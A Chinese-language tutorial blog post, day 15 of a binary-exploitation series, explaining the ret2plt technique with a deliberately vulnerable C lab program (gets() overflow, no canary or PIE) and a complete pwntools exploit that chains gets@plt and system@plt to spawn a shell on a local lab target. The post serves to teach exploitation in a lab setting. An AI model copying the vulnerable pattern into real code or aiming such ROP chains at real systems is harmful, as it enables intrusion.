---
title: "Day15－ret2plt"
date: 2024-09-15
draft: false
tags: ["iron-man-2024", "pwn", "binary-exploitation"]
categories: ["security-research"]
author: "YJK"
showToc: true
TocOpen: false
---


## 前言

昨天剛學完神奇的 one gadgets，今天我們將回到 PLT 表，介紹 ret2plt 的攻擊手法。如果沒有足夠的 gadgets 可供使用，並且無法 leak libc，我們可以將目標轉向 PLT。這種技巧通常被稱為 ret2plt。

## ret2plt

顧名思義，ret2plt 就是將執行流程返回到 PLT 表上。那麼，為什麼這樣做可以取得 shell 呢？我們先來看幾個例子：

- `write(1, "ret2plt", 7)` 在 stack 上的狀況會是：

![image](/images/iron2024/day15_image1.png)

- `puts("ret2plt")` 在 stack 上的狀況會是：

![image](/images/iron2024/day15_image2.png)

這些例子中，實際上都是輸出 "ret2plt" 這個字串。如果有可以利用的 PLT 表，就可以用更短的 chain 完成，而不需要尋找過多可用的 gadgets。類似的：

- `system("/bin/sh")` 在 stack 上的狀況會是：

![image](/images/iron2024/day15_image3.png)

這代表我們可以先透過 `gets` 或其他可以寫入的 PLT 將資料寫進可寫區域，然後把該區域當作 `system@plt` 的參數，這樣就可以將 `/bin/sh` 或 `sh` 寫入並呼叫 `system@plt`。如此一來，便能開啟 shell。

簡單來說，ret2plt 是透過 binary 中已有的函數，先準備好參數，然後直接呼叫這些函數來達成攻擊目的。即使在無法 leak libc 的情況下，也能透過返回 PLT 表來使用該函數，這就是 ret2plt。

## Lab

查看以下程式碼：

```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

void pop_rdi(){
    __asm__("pop %rdi; ret;");
}

int main(){
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stderr, 0, 2, 0);
    char message[0x10];
    system("echo 'Welcome to challenge!'");
    printf("Leave a message: ");
    gets(message);
    return 0;
}
```

使用以下指令進行編譯：

```bash
gcc src/ret2plt.c -o ./ret2plt/share/ret2plt -fno-stack-protector -no-pie
```

你可以自行嘗試這個題目，或繼續閱讀以下解題步驟。

## Writeup

首先，程式在一開始使用了 `system` 來 echo 一段文字，這代表程式編譯時會有 `system@plt`。同時，程式也使用了 `gets`，這使得我們可以進行 buffer overflow 並輸入資料。題目中也沒有 Canary 和 PIE，符合我們進行 ret2plt 的條件。接下來，我們只需要確認以下資訊即可開始撰寫 exploit：

- 可以將資料寫在哪個位置
- 如何疊加 chain

首先，使用 GDB 查看可以寫入的區域。我們可以先執行 `gdb ./ret2plt`，然後設置中斷點 `b main`，執行 `r`，再使用 `vmmap` 查看程式的記憶體區塊。會發現 0x404000~0x405000 之間是可寫的區域。接著，我們可以從後面開始檢查，如 `x/10gx 0x405000-0x100`，發現這些地方沒有被寫入。因此，我們可以選擇 0x404f00 作為寫入位置。

![image](/images/iron2024/day15_image4.png)

![image](/images/iron2024/day15_image5.png)

接著，我們需要使用 `pop rdi` 將要輸入的位置傳遞給 `gets`，這可以透過 `ROPgadget --binary ret2plt | grep "pop rdi"` 找到。我們發現 0x40115a 是 `pop rdi; ret`。

![image](/images/iron2024/day15_image6.png)

接著，使用 `objdump` 查看 `gets@plt` 和 `system@plt` 的地址，輸入 `objdump -M intel -d ret2plt`。結果顯示 `gets@plt` 在 0x401050，`system@plt` 在 0x401030。同時，我們還要確認 padding 的大小，發現輸入會從 `rbp-0x10` 開始，因此 padding 是 `0x10+0x8=0x18`。

![image](/images/iron2024/day15_image7.png)

![image](/images/iron2024/day15_image8.png)

![image](/images/iron2024/day15_image9.png)

資訊確認完畢後，我們可以開始撰寫 exploit。

完整 exploit：

```python
from pwn import *

# r = process('../ret2plt/share/ret2plt')
r = remote('127.0.0.1', 10007)

pop_rdi = 0x000000000040115a
gets_plt = 0x401050
system_plt = 0x401030
bss = 0x404f00

payload = b"A" * (0x10 + 0x8) + p64(pop_rdi) + p64(bss) + p64(gets_plt) + p64(pop_rdi) + p64(bss) + p64(system_plt)

r.sendlineafter(b"Leave a message: ", payload)
r.sendline(b"/bin/sh")
r.interactive()
```

簡單來說，就是透過 `pop rdi; ret` 和 `gets@plt` 將 `/bin/sh` 寫入到 BSS 段，接著再使用 `pop rdi; ret` 將 BSS 段的資料傳遞給 `system@plt`，以此開啟 shell。

solve！！

![image](/images/iron2024/day15_image10.png)
